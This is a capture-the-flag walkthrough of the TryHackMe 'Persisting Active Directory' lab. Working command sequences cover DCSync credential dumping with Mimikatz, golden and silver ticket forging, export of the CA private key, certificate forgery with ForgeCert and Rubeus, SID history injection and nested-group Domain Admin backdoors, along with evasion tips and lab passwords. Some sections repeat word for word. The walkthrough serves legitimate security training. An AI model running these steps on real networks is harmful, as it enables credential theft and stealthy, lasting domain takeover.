# Persisting Active Directory

**Room Link:** [https://tryhackme.com/room/persistingad](https://tryhackme.com/room/persistingad)

## Introduction

**Kali**

```
systemd-resolve --interface persistad --set-dns $THMDCIP --set-domain za.tryhackme.loc
nslookup thmdc.za.tryhackme.loc
```



## Persistence through Credentials

**Kali**

```
ssh Administrator@thmwrk1.za.tryhackme.loc
Password: tryhackmewouldnotguess1@
```

**Kali**

```
xfreerdp +clipboard /u:"Administrator" /v:thmwrk1.za.tryhackme.loc:3389 /size:1024x568 /smart-sizing:800x1200
Password: tryhackmewouldnotguess1@
```

### DCSync All

**Victim(cmd)**

```
C:\Tools\mimikatz_trunk\Win32\mimikatz.exe
```

You will see quite a bit of output, including the current NTLM hash of your account. You can verify that the NTLM hash is correct by using a [website such as this](https://codebeautify.org/ntlm-hash-generator) to transform your password into an NTLM hash.

This is great and all, but we want to DC sync every single account. To do this, we will have to enable logging on Mimikatz.

**Victim(mimikatz)**

```
lsadump::dcsync /domain:za.tryhackme.loc /user:$YourLow-privilegeADUsername
log $username_dcdump.txt
```

<figure><img src="../../.gitbook/assets/image (35) (4).png" alt=""><figcaption></figcaption></figure>

Now, instead of specifying our account, we will use the /all flag:

**Victim(mimikatz)**

```
lsadump::dcsync /domain:za.tryhackme.loc /all
```

<figure><img src="../../.gitbook/assets/image (18) (1) (4).png" alt=""><figcaption></figcaption></figure>

**What is the NTLM hash associated with the krbtgt user?**

**Victim(mimikatz)**

```
lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc
```

<figure><img src="../../.gitbook/assets/image (11) (2) (3).png" alt=""><figcaption></figcaption></figure>

## Persistence through Tickets

### Forging Tickets for Fun and Profit

Now that we have explained the basics for Golden and Silver Tickets, let's generate some. You will need the NTLM hash of the KRBTGT account, which you should now have due to the DC Sync performed in the previous task. Furthermore, make a note of the NTLM hash associated with the THMSERVER1 machine account since we will need this one for our silver ticket. You can find this information in the DC dump that you performed. The last piece of information we need is the Domain SID. Using our low-privileged SSH terminal on THMWRK1, we can use the AD-RSAT cmdlet to recover this information.

**Victim(powershell)**

```
powershell
Get-ADDomain
```

<figure><img src="../../.gitbook/assets/image (5) (1) (4).png" alt=""><figcaption></figcaption></figure>

**Victim(powershell)**

```
exit
C:\Tools\mimikatz_trunk\Win32\mimikatz.exe
```

Once Mimikatz is loaded, perform the following to generate a golden ticket.

Parameters explained:

* /admin - The username we want to impersonate. This does not have to be a valid user.
* /domain - The FQDN of the domain we want to generate the ticket for.
* /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
* /sid -The SID of the domain we want to generate the ticket for.
* /krbtgt -The NTLM hash of the KRBTGT account.
* /endin - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
* /renewmax -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
* /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

**Victim(mimikatz)**

```
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
```

<figure><img src="../../.gitbook/assets/image (116) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can verify that the golden ticket is working by running the dir command against the domain controller.

**Victim(cmd)**

```
dir \\thmdc.za.tryhackme.loc\c$\
```

<figure><img src="../../.gitbook/assets/image (7) (5).png" alt=""><figcaption></figcaption></figure>

Even if the golden ticket has an incredibly long time, the blue team can still defend against this by simply rotating the KRBTGT password twice. If we really want to dig in our roots, we want to generate silver tickets, which are less likely to be discovered and significantly harder to defend against since the passwords of every machine account must be rotated. We can use the following Mimikatz command to generate a silver ticket.

**Victim(mimikatz)**

```
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:$DomainSID /target:$HostnameOfServerBeingTargeted /rc4:$NTLMHashOfMachineAccountOfTarget /service:cifs /ptt
```

## Persistence through Certificates

### Extracting the Private Key

The private key of the CA is stored on the CA server itself. If the private key is not protected through hardware-based protection methods such as an Hardware Security Module (HSM), which is often the case for organisations that just use Active Directory Certificate Services (AD CS) for internal purposes, it is protected by the machine Data Protection API (DPAPI). This means we can use tools such as Mimikatz and SharpDPAPI to extract the CA certificate and thus the private key from the CA. Mimikatz is the simplest tool to use, but if you want to experience other tools, have a look [here](https://pentestlab.blog/2021/11/15/golden-certificate/). Use SSH to authenticate to THMDC.za.tryhackme.loc using the Administrator credentials from Task 2, create a unique directory for your user, move to it, and load Mimikatz.

**Kali**

```
ssh Administrator@thmrootdc.za.tryhackme.loc
Password: tryhackmewouldnotguess1@
```

**Victim(cmd) - THMDC**

```
mkdir epic
cd epic
C:\Tools\mimikatz_trunk\Win32\mimikatz.exe
```

Let's first see if we can view the certificates stored on the DC.

**Victim(mimikatz) - THMDC**

```
crypto::certificates /systemstore:local_machine
```

<figure><img src="../../.gitbook/assets/image (19) (8) (1).png" alt=""><figcaption></figcaption></figure>

We can see that there is a CA certificate on the DC. We can also note that some of these certificates were set not to allow us to export the key. Without this private key, we would not be able to generate new certificates. Luckily, Mimikatz allows us to patch memory to make these keys exportable.

**Victim(mimikatz) - THMDC**

```
privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:local_machine /export
```

<figure><img src="../../.gitbook/assets/image (4) (1) (8).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd) - THMDC**

```
dir
```

<figure><img src="../../.gitbook/assets/image (9) (1) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Generating our own Certificates

Now that we have the private key and root CA certificate, we can use the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert) tool to forge a Client Authenticate certificate for any user we want. The ForgeCert and Rubeus binaries are stored in the C:\Tools\ directory on THMWRK1. Let's use ForgeCert to generate a new certificate:

**Victim(cmd) - THMWRK1**

```
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```

Parameters explained:

* CaCertPath - The path to our exported CA certificate.
* CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`.
* Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
* SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
* NewCertPath - The path to where ForgeCert will store the generated certificate.
* NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:

**Victim(cmd) - THMWRK1**

```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
```

Let's break down the parameters:

* /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
* /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
* /certificate - Path to the certificate we have generated
* /password - The password for our certificate file
* /outfile - The file where our TGT will be output to
* /domain - The FQDN of the domain we are currently attacking
* /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

### Generating our own Certificates

Now that we have the private key and root CA certificate, we can use the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert) tool to forge a Client Authenticate certificate for any user we want. The ForgeCert and Rubeus binaries are stored in the C:\Tools\ directory on THMWRK1. Let's use ForgeCert to generate a new certificate.

**Victim(cmd) - THMWRK1**

```
C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

Parameters explained:

* CaCertPath - The path to our exported CA certificate.
* CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`.
* Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
* SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
* NewCertPath - The path to where ForgeCert will store the generated certificate.
* NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:

**Victim(cmd) - THMWRK1**

```
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
```

Let's break down the parameters:

* /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
* /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
* /certificate - Path to the certificate we have generated
* /password - The password for our certificate file
* /outfile - The file where our TGT will be output to
* /domain - The FQDN of the domain we are currently attacking
* /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

Once we execute the command, we should receive our TGT:

**Victim(cmd) - THMWRK1**

```
C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
```

Now we can use Mimikatz to load the TGT and authenticate to THMDC:

**Victim(cmd) - THMWRK1**

```
C:\Tools\mimikatz_trunk\Win32\mimikatz.exe
```

**Victim(mimikatz) - THMWRK1**

```
kerberos::ptt administrator.kirbi
```

**Victim(cmd) - THMWRK1**

```
dir \\THMDC.za.tryhackme.loc\c$\
```

## Persistence through SID History

**Kali**

```
ssh Administrator@THMCDC.za.tryhackme.loc
Password: tryhackmewouldnotguess1@
```

Get an SSH session on THMDC using the Administrator credentials for this next part. Before we forge SID history, let's just first get some information regarding the SIDs. Firstly, let's make sure that our low-privilege user does not currently have any information in their SID history:

**Victim(cmd) - THMDC**

```
powershell -ep bypass
Get-ADUser $yourAdUsername -properties sidhistory,memberof
```

This confirms that our user does not currently have any SID History set. Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History.

**Victim(powershell) - THMDC**

```
Get-ADGroup "Domain Admins"
```

<figure><img src="../../.gitbook/assets/image (36) (4) (2).png" alt=""><figcaption></figcaption></figure>

We could use something like Mimikatz to add SID history. However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history. Hence we need to use something else. In this case, we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored.

**Victim(powershell) - THMDC**

```
Stop-Service -Name ntds -force 

Add-ADDBSidHistory -SamAccountName $UsernameOfOurLow-privelegedADAccount -SidHistory $SIDtoAddToSIDHistory -DatabasePath C:\Windows\NTDS\ntds.dit 

Start-Service -Name ntds  
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The NTDS database is locked when the NTDS service is running. In order to patch our SID history, we must first stop the service. You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.

After these steps have been performed, let's SSH into THMWRK1 with our low-privileged credentials and verify that the SID history was added and that we now have Domain Admin privileges.

**Kali**

```
ssh $lowUser@thmwrk1.za.tryhackme.loc
```

The NTDS database is locked when the NTDS service is running. In order to patch our SID history, we must first stop the service. You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore.

After these steps have been performed, let's SSH into THMWRK1 with our low-privileged credentials and verify that the SID history was added and that we now have Domain Admin privileges.

**Victim(cmd) - THMWRK1**

```
powershell -ep bypass
Get-ADUser $lowUser -Properties sidhistory 
dir \\thmdc.za.tryhackme.loc\c$ 
```

<figure><img src="../../.gitbook/assets/image (16) (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (117) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Persistence through Group Membership

**Kali**

```
ssh Administrator@THMDC
Password: tryhackmewouldnotguess1@
```

### Nesting Our Persistence

**Victim(powershell) - THMDC**

```
powershell

New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
```

Let's now create another group in the People->Sales OU and add our previous group as a member:

**Victim(powershell) - THMDC**

```
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 

Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
```

We can do this a couple more times, every time adding the previous group as a member:

**Victim(powershell) - THMDC**

```
New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"

New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"

New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"

```

With the last group, let's now add that group to the Domain Admins group:

**Victim(powershell) - THMDC**

```
Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
```

Lastly, let's add our low-privileged AD user to the first group we created:

**Victim(powershell) - THMDC**

```
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```

Instantly, your low-privileged user should now have privileged access to THMDC. Let's verify this by using our SSH terminal on THMWRK1:

**Victim(powershell) - THMWRK1**

```
dir \\thmdc.za.tryhackme.loc\c$\ 
```

<figure><img src="../../.gitbook/assets/image (16) (7) (1).png" alt=""><figcaption></figcaption></figure>

Let's also verify that even though we created multiple groups, the Domain Admins group only has one new member:

**Victim(powershell) - THMDC**

```
Get-ADGroupMember -Identity "Domain Admins"
```

<figure><img src="../../.gitbook/assets/image (5) (1) (2).png" alt=""><figcaption></figcaption></figure>

## Persistence through ACLs

**Kali**

```
xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'$low-privUser' /p:'$Password'
```

See tryhackme on steps

## Persistence through GPOs

See tryhackme on steps
